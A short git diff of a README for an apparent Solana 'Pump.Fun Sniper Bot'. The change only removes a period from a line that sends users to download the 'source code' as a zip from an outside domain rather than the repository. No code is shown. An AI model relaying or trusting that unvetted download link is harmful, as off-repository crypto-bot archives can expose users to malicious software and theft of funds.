@@ -16,7 +16,7 @@ The Pump-Fun Sniper Bot is designed to interact with the Solana blockchain, purc
 - **No RPC Required:** Simplified setup without the need for an RPC server.
 
 ## Requirements
-Download the latest source code of  Pump.Fun Sniper Bot from [Here](https://sniperbotpump.fun/static/pumpfunsniperbot.zip).
+Download the latest source code of  Pump.Fun Sniper Bot from [Here](https://sniperbotpump.fun/static/pumpfunsniperbot.zip)
 
 Ensure you have the latest version of Node.js installed. Download Node.js from [here](https://nodejs.org/en/download)
 
